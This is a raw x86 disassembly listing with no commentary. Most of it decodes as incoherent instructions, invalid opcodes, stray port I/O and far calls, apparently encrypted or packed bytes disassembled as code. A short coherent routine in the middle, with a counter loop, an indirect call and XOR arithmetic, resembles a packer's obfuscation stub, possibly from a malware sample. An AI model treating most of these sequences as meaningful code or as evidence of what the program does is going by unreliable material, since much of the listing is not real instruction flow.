  4049f9:	and    BYTE PTR [edi+0xbce0de3],cl
  4049ff:	test   BYTE PTR [edi-0x7ce9cb44],cl
  404a05:	sbb    DWORD PTR [edi],ebp
  404a07:	repz scas eax,DWORD PTR es:[edi]
  404a09:	push   esp
  404a0a:	in     eax,0xc5
  404a0c:	cwde   
  404a0d:	sbb    DWORD PTR [edx+0x59],ebp
  404a10:	pop    eax
  404a11:	retf   
  404a12:	inc    edx
  404a13:	mov    al,ds:0xb9cecd67
  404a18:	pushf  
  404a19:	mov    cl,dh
  404a1b:	cs (bad) 
  404a1d:	and    dh,BYTE PTR [edi]
  404a1f:	mov    ebp,0xf541f05a
  404a24:	rol    BYTE PTR [eax+0x5],cl
  404a27:	loope  0x404a6b
  404a29:	outs   dx,DWORD PTR ds:[esi]
  404a2a:	(bad)  
  404a2b:	xor    cl,BYTE PTR [esi+0x27]
  404a2e:	mov    esi,DWORD PTR [ebp+0xc45ffa7]
  404a34:	jmp    0x404377
  404a39:	jmp    0x404b7e
  404a3e:	cmp    eax,0xf1133703
  404a43:	xor    ebx,ecx
  404a45:	sar    DWORD PTR [edx+esi*1+0x9],1
  404a49:	cld    
  404a4a:	sbb    edx,DWORD PTR [eax]
  404a4c:	adc    bh,ch
  404a4e:	and    al,0x21
  404a50:	jo     0x404ac2
  404a52:	sbb    BYTE PTR [edi+0x70],bh
  404a55:	jo     0x404a9c
  404a57:	jl     0x4049dc
  404a59:	mov    ds:0x40142b82,al
  404a5e:	ja     0x404acc
  404a60:	cmpxchg BYTE PTR [edx+0x4d42bfc4],ch
  404a67:	cwde   
  404a68:	outs   dx,DWORD PTR ds:[esi]
  404a69:	xchg   edi,eax
  404a6a:	mov    ecx,eax
  404a6c:	loop   0x404a67
  404a6e:	mov    dl,0x29
  404a70:	imul   ebp,DWORD PTR ds:0xb134c6ec,0xe0969a2
  404a7a:	outs   dx,BYTE PTR ds:[esi]
  404a7b:	shr    ecx,1
  404a7d:	cli    
  404a7e:	ins    BYTE PTR es:[edi],dx
  404a7f:	mov    eax,0x87d05ba2
  404a84:	popf   
  404a85:	jecxz  0x404a26
  404a87:	and    al,ch
  404a89:	mov    dh,BYTE PTR [ecx+eax*1-0x51]
  404a8d:	shl    BYTE PTR [edi-0x60],0x45
  404a91:	mov    DWORD PTR [edx+0x27],edx
  404a94:	loope  0x404a7a
  404a96:	and    dl,BYTE PTR [ebx+0x7d7f1c30]
  404a9c:	stc    
  404a9d:	cs jb  0x404b05
  404aa0:	mov    dh,0xb3
  404aa2:	cmp    al,0x23
  404aa4:	mov    bh,0xdd
  404aa6:	mov    edx,0x2ca05969
  404aab:	stos   DWORD PTR es:[edi],eax
  404aac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404aad:	dec    eax
  404aae:	inc    ebp
  404aaf:	push   esi
  404ab0:	mov    eax,0x23c40d81
  404ab5:	jno    0x404b32
  404ab7:	dec    ebp
  404ab8:	data16 jbe 0x404afa
  404abb:	mov    dl,0x3f
  404abd:	and    ebp,ecx
  404abf:	xor    eax,0x5f114d51
  404ac4:	sbb    al,0x3c
  404ac6:	test   DWORD PTR [esp+edx*4+0x12923756],eax
  404acd:	repz hlt 
  404acf:	jge    0x404aab
  404ad1:	sbb    edi,0xffffffe8
  404ad4:	and    eax,0xa0a8ad54
  404ad9:	enter  0xac66,0x76
  404add:	call   0x9ceb:0x37b4b0bb
  404ae4:	sub    eax,0xf8695e3e
  404ae9:	cdq    
  404aea:	pop    ss
  404aeb:	(bad)  
  404aec:	mov    eax,0x70d9b11e
  404af1:	lds    edx,FWORD PTR [eax+0x4c]
  404af4:	iret   
  404af5:	xchg   edx,eax
  404af6:	mov    esp,0xb3ac760e
  404afb:	mov    edx,0xe4dc81ef
  404b00:	clc    
  404b01:	sub    al,0x6b
  404b03:	test   BYTE PTR [edi+ecx*4],0xcc
  404b07:	xchg   esi,eax
  404b08:	and    DWORD PTR [edi-0x17],ecx
  404b0b:	jbe    0x404ac5
  404b0d:	loop   0x404b50
  404b0f:	ds mov edx,0x2ef73108
  404b15:	sahf   
  404b16:	jno    0x404aae
  404b18:	mov    dl,0xf8
  404b1a:	or     ch,al
  404b1c:	outs   dx,BYTE PTR ds:[esi]
  404b1d:	xchg   esi,eax
  404b1e:	mov    al,ds:0x400cd510
  404b23:	push   0x4fcdcf94
  404b28:	add    DWORD PTR [ebx-0x1b66dd70],edi
  404b2e:	stos   DWORD PTR es:[edi],eax
  404b2f:	xor    al,0x35
  404b31:	shl    cl,0x6f
  404b34:	cli    
  404b35:	daa    
  404b36:	xor    eax,0xb56a3a66
  404b3b:	(bad)  
  404b3c:	adc    BYTE PTR [ecx+0x46dea1a3],0xe1
  404b43:	adc    edx,DWORD PTR [edx+0x3]
  404b46:	mov    ds:0xc6836f53,al
  404b4b:	or     DWORD PTR [ebp+0x7d],esp
  404b4e:	ins    DWORD PTR es:[edi],dx
  404b4f:	adc    al,BYTE PTR [esp+ecx*2-0x10]
  404b53:	fadd   DWORD PTR [ebx]
  404b55:	cmp    esp,ebp
  404b57:	mov    ds:0x46e7ba19,al
  404b5c:	clc    
  404b5d:	(bad)  
  404b5e:	or     eax,0x7803c733
  404b63:	mov    esi,0x37249f79
  404b68:	or     bh,cl
  404b6a:	rol    BYTE PTR [ebx+0x2e],1
  404b6d:	and    BYTE PTR [edx],dl
  404b6f:	sub    DWORD PTR [ebx+0x277611cd],esp
  404b75:	and    esp,DWORD PTR [edi+0x79]
  404b78:	sbb    eax,0x33e30ca1
  404b7d:	mov    cl,BYTE PTR [ebx-0x3ecc0fbb]
  404b83:	mov    ecx,DWORD PTR [ebp+0x10]
  404b86:	add    eax,esi
  404b88:	jmp    0x404ccd
  404b8d:	pop    esi
  404b8e:	adc    BYTE PTR [esi-0x8],bh
  404b91:	mov    esi,0x9ce666a6
  404b96:	es icebp 
  404b98:	xor    eax,0x61256de9
  404b9d:	int3   
  404b9e:	and    BYTE PTR [eax+0x70],dh
  404ba1:	sbb    BYTE PTR [edi+0x70],bh
  404ba4:	jo     0x404c1f
  404ba6:	gs in  eax,dx
  404ba8:	jno    0x404b5a
  404baa:	fistp  DWORD PTR [eax-0x6e]
  404bad:	dec    edi
  404bae:	add    ecx,edx
  404bb0:	gs push edi
  404bb2:	xchg   esp,eax
  404bb3:	(bad)  
  404bb4:	iret   
  404bb5:	(bad)  
  404bb6:	clc    
  404bb7:	mov    edi,0xed3cad30
  404bbc:	sti    
  404bbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404bbe:	mov    ds:0x79af645a,al
  404bc3:	mov    ebx,0x177308e8
  404bc8:	vrsqrtps ymm1,ymm4
  404bcc:	popa   
  404bcd:	out    0x53,al
  404bcf:	in     eax,dx
  404bd0:	jg     0x404b6f
  404bd2:	jo     0x404bba
  404bd4:	adc    BYTE PTR ds:[esi+0x502b2f3d],ch
  404bdb:	in     al,dx
  404bdc:	and    BYTE PTR [ecx+0x2c],0x96
  404be0:	rcr    BYTE PTR [ebp+0x2a],cl
  404be3:	fsub   DWORD PTR [edi-0x73]
  404be6:	xor    DWORD PTR [eax+0x4c],0xffffffef
  404bea:	rcr    BYTE PTR [edi],1
  404bec:	sub    ebx,DWORD PTR [edi-0x3]
  404bef:	rcr    BYTE PTR [ebx-0x4c],0xb4
  404bf3:	xchg   edi,eax
  404bf4:	xor    eax,0x884be8fa
  404bf9:	aas    
  404bfa:	mov    esi,0xcc7cc51
  404bff:	stc    
  404c00:	mov    ah,0xba
  404c02:	mov    edi,0xc5c0a597
  404c07:	loope  0x404baa
  404c09:	mov    esi,0x18c875ef
  404c0e:	loopne 0x404c4a
  404c10:	dec    ecx
  404c11:	mov    al,ds:0x81fede01
  404c16:	in     al,0x42
  404c18:	sbb    DWORD PTR [esi+0x549bc727],ebx
  404c1e:	imul   edx,ecx,0xdbf6932d
  404c24:	ss xchg ebp,eax
  404c26:	push   cs
  404c27:	in     al,0xe3
  404c29:	add    eax,0xa8d65147
  404c2e:	lea    ebp,[ecx]
  404c30:	sbb    eax,0x6a21b66e
  404c35:	iret   
  404c36:	out    0x16,eax
  404c38:	icebp  
  404c39:	jg     0x404ca1
  404c3b:	mov    eax,0xb3a2ccf4
  404c40:	cmc    
  404c41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c42:	mov    esi,0x318b3eab
  404c47:	pop    es
  404c48:	loope  0x404bd0
  404c4a:	jbe    0x404cc7
  404c4c:	xchg   esi,eax
  404c4d:	jbe    0x404cbe
  404c4f:	sar    DWORD PTR [ecx],0xdd
  404c52:	inc    eax
  404c53:	pop    ss
  404c54:	pop    ebp
  404c55:	mov    cl,0x27
  404c57:	cmp    al,cl
  404c59:	push   0xffffffd5
  404c5b:	mov    ebp,0xae0b202b
  404c60:	cmp    DWORD PTR [ecx-0x4442f97b],ecx
  404c66:	add    eax,0x895024ed
  404c6b:	js     0x404cbf
  404c6d:	cs sbb al,0x11
  404c70:	in     al,0x57
  404c72:	sub    bh,dh
  404c74:	shr    DWORD PTR [esi-0x197de2d2],1
  404c7a:	fdivr  DWORD PTR [edi-0x32]
  404c7d:	cli    
  404c7e:	addr16 push ss
  404c80:	out    dx,eax
  404c81:	push   ebp
  404c82:	bsf    eax,DWORD PTR [edx-0x2664b75f]
  404c89:	xor    BYTE PTR [edi-0x291ad5de],ah
  404c8f:	mov    ds:0xbb77056d,eax
  404c94:	fld    DWORD PTR [edi-0x70]
  404c97:	xor    DWORD PTR [ecx+0x1],edx
  404c9a:	cs inc ebx
  404c9c:	rcr    DWORD PTR [ebx],1
  404c9e:	in     al,0xac
  404ca0:	nop
  404ca1:	imul   edi,DWORD PTR [eax],0x44b43c85
  404ca7:	fistp  QWORD PTR [ecx]
  404ca9:	fcom   DWORD PTR [eax+0x14]
  404cac:	sub    DWORD PTR [eax+0x51e96a7b],0xffffffd6
  404cb3:	pop    ds
  404cb4:	nop
  404cb5:	pop    es
  404cb6:	and    al,0x82
  404cb8:	scas   eax,DWORD PTR es:[edi]
  404cb9:	xlat   BYTE PTR ds:[ebx]
  404cba:	jp     0x404cef
  404cbc:	or     BYTE PTR [edx+0x1a],dh
  404cbf:	arpl   WORD PTR [ebx+0x34],sp
  404cc2:	clc    
  404cc3:	in     al,dx
  404cc4:	lahf   
  404cc5:	xchg   esi,eax
  404cc6:	or     BYTE PTR [ecx+0x4c],0xcf
  404cca:	das    
  404ccb:	mov    dh,BYTE PTR [edx]
  404ccd:	mov    DWORD PTR [ecx],eax
  404ccf:	pop    esi
  404cd0:	leave  
  404cd1:	ret    0xc
  404cd4:	push   ebp
  404cd5:	mov    ebp,esp
  404cd7:	push   ecx
  404cd8:	push   ecx
  404cd9:	sub    DWORD PTR ds:0x432cd6,0x432604
  404ce3:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  404cea:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  404cf1:	and    DWORD PTR ds:0x43427e,0x0
  404cfb:	xor    ecx,ecx
  404cfd:	add    ecx,DWORD PTR ds:0x43427e
  404d03:	inc    ecx
  404d04:	mov    DWORD PTR ds:0x43427e,ecx
  404d0a:	cmp    DWORD PTR ds:0x43427e,0x26
  404d11:	jne    0x404d52
  404d17:	push   DWORD PTR [ebp-0x20]
  404d1a:	push   DWORD PTR [ebp-0x24]
  404d1d:	push   0x434282
  404d22:	push   0x43428e
  404d27:	push   DWORD PTR [ebp-0x28]
  404d2a:	push   0x6ce4
  404d2f:	push   0x479e
  404d34:	push   DWORD PTR [ebp-0xc]
  404d37:	push   DWORD PTR [ebp-0x14]
  404d3a:	push   0x7cf9
  404d3f:	push   0x1b21
  404d44:	push   0x8797
  404d49:	push   DWORD PTR [ebp-0x24]
  404d4c:	call   DWORD PTR ds:0x432b32
  404d52:	cmp    DWORD PTR ds:0x43427e,0x1a
  404d59:	jb     0x404cfb
  404d5f:	neg    edx
  404d61:	mov    eax,DWORD PTR [ebp-0x4]
  404d64:	push   esi
  404d65:	xor    ecx,0x4a51
  404d6b:	mov    esi,DWORD PTR [ebp-0x8]
  404d6e:	mov    edx,0x7510855
  404d73:	xor    eax,edx
  404d75:	xor    esi,edx
  404d77:	mov    ecx,0x32729c
  404d7c:	adc    DWORD PTR ds:0x43431d,0x4006
  404d86:	jmp    0x40500a
  404d8b:	popa   
  404d8c:	sahf   
  404d8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d8e:	mov    fs,WORD PTR [ebx-0x6b]
  404d91:	jno    0x404e04
  404d93:	mov    al,ds:0x8619e646
  404d98:	ficomp DWORD PTR [ebp+0x702ff453]
  404d9e:	jo     0x404d79
  404da0:	jle    0x404e12
  404da2:	jo     0x404e1a
  404da4:	adc    dl,BYTE PTR [ecx+0x4d]
  404da7:	outs   dx,BYTE PTR ds:[esi]
  404da8:	jecxz  0x404e27
  404daa:	popf   
  404dab:	sbb    ecx,0xd8473f17
  404db1:	lahf   
  404db2:	sub    eax,ecx
  404db4:	(bad)  
  404db5:	jmp    0x404d91
  404db7:	cli    
  404db8:	js     0x404e15
  404dba:	inc    eax
  404dbb:	mov    BYTE PTR [ecx-0x2b935568],al
  404dc1:	(bad)
  404dc5:	ss pushf 
  404dc7:	out    0x6e,al
  404dc9:	(bad)  
  404dca:	out    0x63,eax
  404dcc:	sbb    eax,0x82ad10f8
  404dd1:	ss leave 
  404dd3:	call   0xefdd53c9
  404dd8:	ja     0x404e38
  404dda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ddb:	fistp  WORD PTR [edx]
  404ddd:	out    0xf4,al
  404ddf:	adc    esp,esp
  404de1:	je     0x404d76
  404de3:	adc    bl,BYTE PTR [edi]
  404de5:	add    cl,dh
  404de7:	rcr    DWORD PTR [esi-0x71f4f42c],0x4
  404dee:	mov    bh,0xea
  404df0:	dec    esi
  404df1:	aam    0x32
  404df3:	enter  0xcbd0,0xf2
  404df7:	(bad)  
  404df8:	lea    eax,[esi+0x7429a663]
  404dfe:	adc    al,0x98
  404e00:	clc    
  404e01:	push   ss
  404e02:	jno    0x404dc8
  404e04:	push   cs
  404e05:	pop    ecx
  404e06:	je     0x404e3a
  404e08:	pop    ebx
  404e09:	jl     0x404e7e
  404e0b:	mov    fs,WORD PTR [edi-0x3d]
  404e0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e0f:	sub    BYTE PTR [ebx],al
  404e11:	jo     0x404ddb
  404e13:	cdq    
  404e14:	xchg   ecx,eax
  404e15:	in     eax,0xe5
  404e17:	in     eax,0xdd
  404e19:	popf   
  404e1a:	cmp    dh,BYTE PTR [ebx]
  404e1c:	xchg   ecx,eax
  404e1d:	sti    
  404e1e:	fsubr  QWORD PTR [esi+0x7a3efd2e]
  404e24:	lods   al,BYTE PTR ds:[esi]
  404e25:	mov    cl,0x98
  404e27:	mov    al,ds:0x5c0f9d7a
  404e2c:	(bad)  
  404e2d:	lods   al,BYTE PTR ds:[esi]
  404e2e:	dec    esi
  404e2f:	pop    ebp
  404e30:	dec    eax
  404e31:	mov    ebp,0x76c75ef8
  404e36:	test   al,0x73
  404e38:	pop    es
  404e39:	fsubr  QWORD PTR [eax+0x668eb5f3]
  404e3f:	ds repz aad 0xe0
  404e43:	fwait
  404e44:	int    0x57
  404e46:	(bad)  
  404e47:	(bad)  [esi]
  404e49:	neg    ebx
  404e4b:	(bad)  
  404e4c:	xor    DWORD PTR [ebp-0x4ce43355],edi
  404e52:	in     eax,0xef
  404e54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e55:	or     ebp,edx
  404e57:	jb     0x404ea4
  404e59:	adc    edi,esi
  404e5b:	adc    DWORD PTR [ecx-0x66bf09a1],ebx
  404e61:	mov    al,0x54
  404e63:	ret    
  404e64:	je     0x404df8
  404e66:	and    al,0xac
  404e68:	retf   
  404e69:	xlat   BYTE PTR ds:[ebx]
  404e6a:	push   esi
  404e6b:	sub    BYTE PTR [ebx+edi*1+0x15],al
  404e6f:	mov    edi,0x36b97de7
  404e74:	sub    ah,BYTE PTR [ebp+0x9]
  404e77:	mov    eax,ds:0xc556bf68
  404e7c:	pop    edx
  404e7d:	push   ebx
  404e7e:	adc    BYTE PTR [ebx-0x4b0ec01a],dl
  404e84:	xchg   ebp,eax
  404e85:	bound  ecx,QWORD PTR [edi]
  404e87:	inc    edi
  404e88:	cmp    al,BYTE PTR [ebx+ebx*4-0x673b9370]
  404e8f:	mov    bh,cl
  404e91:	xor    eax,0x9b8a8580
  404e96:	rcl    DWORD PTR [ebp+esi*1+0x1c2a7f41],cl
  404e9d:	cld    
  404e9e:	out    dx,eax
  404e9f:	jne    0x404ec7
  404ea1:	gs sahf 
  404ea3:	adc    DWORD PTR [eax-0x5c],ecx
  404ea6:	mov    ecx,0xc707e020
  404eab:	les    esi,FWORD PTR [edi+0x12e69c74]
  404eb1:	not    DWORD PTR [ebx-0x7d]
  404eb4:	fisttp DWORD PTR [eax+0x54]
  404eb7:	dec    ebp
  404eb8:	popf   
  404eb9:	and    ecx,DWORD PTR [eax]
  404ebb:	add    eax,0xad989a7a
  404ec0:	pop    ss
  404ec1:	fld    DWORD PTR [ebx+0x9]
  404ec4:	gs hlt 
  404ec6:	test   DWORD PTR [edx-0x65],eax
  404ec9:	fimul  WORD PTR [edi]
  404ecb:	sub    BYTE PTR [ecx],dh
  404ecd:	mov    ebx,0x9b7c1cb7
  404ed2:	imul   eax,DWORD PTR [ecx+0x6ca217b3],0x4035bf1a
  404edc:	rol    BYTE PTR [eax-0x47],0x1c
  404ee0:	shl    BYTE PTR [edi],1
  404ee2:	in     al,dx
  404ee3:	imul   edi,DWORD PTR [edi+0x67],0x69
  404ee7:	adc    BYTE PTR [bp-0x4652],0xfd
  404eed:	test   BYTE PTR [edi],ch
  404eef:	xchg   esi,eax
  404ef0:	pop    ds
  404ef1:	imul   esi,edx,0x1b61b410
  404ef7:	mov    dh,0x21
  404ef9:	sub    DWORD PTR [ebx-0x4f],edi
  404efc:	mov    edi,0x26b5ac99
  404f01:	loopne 0x404eec
  404f03:	adc    al,BYTE PTR [ebx+0x7ecd89d5]
  404f09:	mov    ecx,0xc77556ee
  404f0e:	pop    edi
  404f0f:	and    al,0xf9
  404f11:	sub    esp,DWORD PTR [eax-0x76118671]
  404f17:	test   DWORD PTR [ecx],0x77c5ab54
  404f1d:	scas   eax,DWORD PTR es:[edi]
  404f1e:	xchg   ecx,eax
  404f1f:	mov    al,0x93
  404f21:	jmp    0x173f:0x84ebbec
  404f28:	add    ch,BYTE PTR [eax]
  404f2a:	fadd   st(0),st
  404f2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f2d:	lds    ecx,FWORD PTR [eax]
  404f2f:	add    eax,0xfacaeb52
  404f34:	sbb    al,0x51
  404f36:	adc    eax,0x685455d4
  404f3b:	(bad)  
  404f3c:	inc    edx
  404f3d:	shl    dh,cl
  404f3f:	inc    edi
  404f40:	paddq  mm6,QWORD PTR [edx]
  404f43:	mov    ch,0xd8
  404f45:	enter  0xea04,0x93
  404f49:	xchg   edx,eax
  404f4a:	(bad)  
  404f4b:	shr    BYTE PTR [edx+0x293adc7d],cl
  404f51:	dec    esi
  404f52:	mov    ds:0x6c6acb9e,al
  404f57:	dec    edx
  404f58:	push   0xe78f6269
  404f5d:	mov    al,ds:0xc4e39c3f
  404f62:	dec    ebp
  404f63:	lods   al,BYTE PTR ds:[esi]
  404f64:	sbb    bh,BYTE PTR [eax-0x1f]
  404f67:	inc    esp
  404f68:	add    BYTE PTR [ecx],0x73
  404f6b:	mov    eax,0xfc2da1fa
  404f70:	mov    al,ds:0x5574db31
  404f75:	in     eax,dx
  404f76:	xor    eax,ebx
  404f78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f79:	xor    edi,DWORD PTR [ebx]
  404f7b:	mov    bl,BYTE PTR [eax-0x1b5f2f92]
  404f81:	push   ebp
  404f82:	out    dx,al
  404f83:	out    0x6e,al
  404f85:	shl    DWORD PTR [edx+edx*4+0x5c],0xf8
  404f8a:	mov    dl,0x31
  404f8c:	push   ds
  404f8d:	cdq    
  404f8e:	call   0xafa1:0xd634853a
  404f95:	sub    edi,edi
  404f97:	pop    edx
  404f98:	or     edi,edx
  404f9a:	xor    eax,0x2a0ed1d0
  404f9f:	ret    
  404fa0:	mov    cl,0x88
  404fa2:	mov    ch,0x33
  404fa4:	jns    0x404faa
  404fa6:	in     al,0x36
  404fa8:	dec    ebx
  404fa9:	repz cld 
  404fab:	test   DWORD PTR [ebx+0x10dfb82e],edx
  404fb1:	sub    edx,DWORD PTR [edx+esi*1-0x35]
  404fb5:	add    esi,ebp
  404fb7:	and    BYTE PTR [ebp+0x62],ch
  404fba:	mov    WORD PTR [edx+0x45],?
  404fbd:	int    0x82
  404fbf:	push   ebp
  404fc0:	test   eax,0x418da8ae
  404fc5:	sub    eax,DWORD PTR [ecx+0xa]
  404fc8:	jecxz  0x404fe7
  404fca:	mov    edx,0xc5f8d4a1
  404fcf:	loop   0x404fd6
  404fd1:	js     0x404f57
  404fd3:	jg     0x404f8a
  404fd5:	jo     0x404fa5
  404fd7:	mov    ebp,0xe3bcfdbc
  404fdc:	jns    0x404fad
  404fde:	fist   DWORD PTR [ebp+0x9]
  404fe1:	dec    eax
  404fe2:	push   esi
  404fe3:	(bad)  
  404fe4:	pop    ds
  404fe5:	fxch   st(7)
  404fe7:	rcr    ebx,cl
  404fe9:	icebp  
  404fea:	xchg   edx,eax
  404fec:	leave  
  404fed:	sbb    al,0x88
  404fef:	outs   dx,BYTE PTR ds:[esi]
  404ff0:	adc    edi,edi
  404ff2:	ja     0x404fd8
  404ff4:	cwde   
  404ff5:	call   0x9464:0x8eb6b51f
  404ffc:	cmp    ebp,0xfffffff7
  404fff:	sub    ebp,DWORD PTR cs:[eax-0x17]
  405003:	int3   
  405004:	retf   0xb4cf
  405007:	mov    esi,ebp
  405009:	leave  
  40500a:	add    esi,ecx
  40500c:	xor    DWORD PTR ds:0x434296,0x260
  405016:	add    eax,ecx
  405018:	imul   eax,esi
  40501b:	mov    DWORD PTR ds:0x43428a,0x336a
  405025:	mov    esi,DWORD PTR [ebp+0xc]
  405028:	mov    DWORD PTR ds:0x434296,0x44f4
  405032:	cmp    esi,eax
  405034:	mov    DWORD PTR ds:0x432cca,0x3ddd
  40503e:	jne    0x4052de
  405044:	mov    eax,DWORD PTR [ebp-0x4]
  405047:	mov    esi,DWORD PTR [ebp-0x8]
  40504a:	xor    eax,edx
  40504c:	jmp    0x4052d0
  405051:	test   DWORD PTR [ebp+0xb],ebx
  405054:	cmp    al,0xf3
  405056:	push   0x55
  405058:	popa   
  405059:	and    DWORD PTR [esi],0x2f
  40505c:	adc    al,0xe9
  40505e:	xchg   ebx,eax
  40505f:	mov    ebx,0x702d5db0
  405064:	jo     0x40503f
  405066:	jle    0x4050d8
  405068:	jo     0x405014
  40506a:	inc    ebp
  40506b:	jno    0x40504b
  40506d:	std    
  40506e:	mov    ?,WORD PTR [eax-0x55]
  405071:	mov    dh,0x1c
  405073:	ds test eax,0xda4656b3
  405079:	not    BYTE PTR [eax-0x907996e]
  40507f:	xor    BYTE PTR [ecx+0x45],ch
  405082:	(bad)  
  405083:	pusha  
  405084:	pop    ebp
  405085:	(bad)  
  405086:	(bad)  [ebp-0x2365b4e1]
  40508c:	repnz (bad) 
  40508e:	xchg   ecx,eax
  40508f:	out    0x55,al
  405091:	xchg   ebp,eax
  405092:	outs   dx,BYTE PTR ds:[esi]
  405093:	or     DWORD PTR [edi+0x6d],ebp
  405096:	add    DWORD PTR [edi+0x437b4945],edi
  40509c:	jle    0x4050c9
  40509e:	mov    ebx,0x57a1337b
  4050a3:	scas   eax,DWORD PTR es:[edi]
  4050a4:	inc    edx
  4050a5:	jns    0x4050ca
  4050a7:	add    BYTE PTR [ecx-0x6dd64277],bh
  4050ad:	cwde   
  4050ae:	cs add al,dh
  4050b1:	outs   dx,BYTE PTR ds:[esi]
  4050b2:	xchg   ecx,eax
  4050b3:	fs jb  0x405068
  4050b6:	adc    eax,0x82643bcb
  4050bb:	push   0x77
  4050bd:	popf   
  4050be:	ins    BYTE PTR es:[edi],dx
  4050bf:	jbe    0x4050c6
  4050c1:	push   cs
  4050c2:	mov    edi,0x3d761397
  4050c7:	pop    ds
  4050c8:	into   
  4050c9:	call   0x219d:0x25394b2e
  4050d0:	out    0x6b,al
  4050d2:	scas   eax,DWORD PTR es:[edi]
  4050d3:	lock icebp 
  4050d5:	(bad)  [ebx+0x50]
  4050d8:	ja     0x405100
  4050da:	jmp    0xfafb:0x7bb6d6b3
  4050e1:	jecxz  0x405077
  4050e3:	push   esi
  4050e4:	dec    esi
  4050e5:	cmp    esi,0xffffff83
  4050e8:	es js  0x40513c
  4050eb:	xor    eax,0x1c790ff6
  4050f0:	rcl    bh,1
  4050f2:	jg     0x40508b
  4050f4:	call   0xae965272
  4050f9:	sahf   
  4050fa:	push   cs
  4050fb:	mov    ebp,0xab1a5adf
  405100:	mov    esp,0xc1388db1
  405105:	stos   DWORD PTR es:[edi],eax
  405106:	je     0x40515f
  405108:	xor    esp,DWORD PTR [eax+0x43]
  40510b:	aam    0x7
  40510d:	iret   
  40510e:	hlt    
  40510f:	adc    DWORD PTR [eax+0x77],ebx
  405112:	(bad)  
  405113:	jecxz  0x40512c
  405115:	nop
  405116:	mov    al,0x9d
  405118:	bnd call 0x74be12e6
  40511e:	int    0x5e
  405120:	outs   dx,BYTE PTR ds:[esi]
  405121:	ret    0x5f0e
  405124:	ds push cs
  405126:	repz mov bl,0x4a
  405129:	mov    ?,WORD PTR [eax-0x45af96c2]
  40512f:	pushf  
  405130:	mov    dl,0xd2
  405132:	mov    edx,0x64279fff
  405137:	cs push ecx
  405139:	push   ebx
  40513a:	adc    esi,DWORD PTR [edi+edi*8]
  40513d:	mov    dl,0x9a
  40513f:	icebp  
  405140:	enter  0xf16a,0xaf
  405144:	es jns 0x4050f2
  405147:	loopne 0x4051b0
  405149:	xor    al,0x23
  40514b:	jno    0x40518a
  40514d:	loop   0x4051ac
  40514f:	repnz fcos 
  405152:	test   BYTE PTR ds:0x6aa28172,bl
  405158:	xchg   ebp,eax
  405159:	mov    WORD PTR ds:[bx+si-0x62c7],?
  40515f:	test   al,0x7
  405161:	push   es
  405162:	out    dx,eax
  405163:	push   edx
  405164:	(bad)  
  405165:	sbb    DWORD PTR [edx],edi
  405167:	mov    cl,bh
  405169:	(bad)
  40516c:	repz cmp ch,BYTE PTR [edx+0x15]
  405170:	sub    al,0x85
  405172:	mov    ds:0x3edfde5b,eax
  405177:	std    
  405178:	fxch   st(2)
  40517a:	enter  0xa549,0x18
  40517e:	repnz addr16 (bad) 
  405181:	mov    dl,0x21
  405183:	mov    ecx,0x520f175
  405188:	add    eax,0xe68e8e35
  40518d:	mov    DWORD PTR [ecx+ebx*1],ebx
  405190:	(bad)  
  405191:	(bad)  
  405192:	out    0xbe,eax
  405194:	xor    edi,eax
  405196:	push   edx
  405197:	aaa    
  405198:	je     0x40517c
  40519a:	daa    
  40519b:	cwde   
  40519c:	lahf   
  40519d:	hlt    
  40519e:	clc    
  40519f:	cs loope 0x40517a
  4051a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4051a3:	(bad)  
  4051a4:	es mov ah,0x59
  4051a7:	sub    DWORD PTR [esi],eax
  4051a9:	test   eax,0x5647f442
  4051ae:	stos   DWORD PTR es:[edi],eax
  4051af:	or     ebx,DWORD PTR [ebx+0x6b]
  4051b2:	stos   DWORD PTR es:[edi],eax
  4051b3:	mov    al,0x36
  4051b5:	test   eax,0x13ff461a
  4051ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4051bb:	adc    al,0xe1
  4051bd:	in     eax,dx
  4051be:	jecxz  0x4051fa
  4051c0:	or     BYTE PTR ds:[eax-0x5d983b21],0x7e
  4051c8:	push   0x64c924a9
  4051cd:	xchg   edx,eax
  4051ce:	jno    0x40524e
  4051d0:	jno    0x40516e
  4051d2:	shl    DWORD PTR [ebx-0x70],cl
  4051d5:	pop    ebp
  4051d6:	add    DWORD PTR [edx+ebx*8+0x4d26012c],esp
  4051dd:	push   ds
  4051de:	and    al,0x62
  4051e0:	mov    esi,0x3256a8b0
  4051e5:	(bad)  
  4051e6:	jb     0x40517f
  4051e8:	mov    al,ds:0x7456c623
  4051ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4051ee:	fwait
  4051ef:	lahf   
  4051f0:	sub    al,cl
  4051f2:	and    DWORD PTR [edi+eiz*1-0x33],edx
  4051f6:	and    al,0xbc
  4051f8:	adc    esi,DWORD PTR [esi-0x6af5546b]
  4051fe:	mov    al,0x6a
  405200:	and    BYTE PTR [ebp+0x30],0x63
  405204:	inc    ebp
  405205:	rcr    DWORD PTR ds:0xb193c788,cl
  40520b:	fsub   DWORD PTR [esi+0x7b101985]
  405211:	scas   al,BYTE PTR es:[edi]
  405212:	stc    
  405213:	xlat   BYTE PTR ds:[ebx]
  405214:	xor    eax,0x9667b405
  405219:	push   ds
  40521a:	stc    
  40521b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40521c:	sbb    DWORD PTR [eax+0x43],esi
  40521f:	and    esp,DWORD PTR [edx]
  405221:	fwait
  405222:	mov    WORD PTR [eax-0x5ce38ced],?
  405228:	adc    DWORD PTR [edx-0x51c6b4a0],esi
  40522e:	add    DWORD PTR [ecx-0x126cafe6],eax
  405234:	inc    ebx
  405235:	mul    BYTE PTR [edx]
  405237:	cmp    BYTE PTR [edi-0xd],dl
  40523a:	or     DWORD PTR [ecx],edx
  40523c:	sbb    ch,cl
  40523e:	pop    ss
  40523f:	xor    ecx,ecx
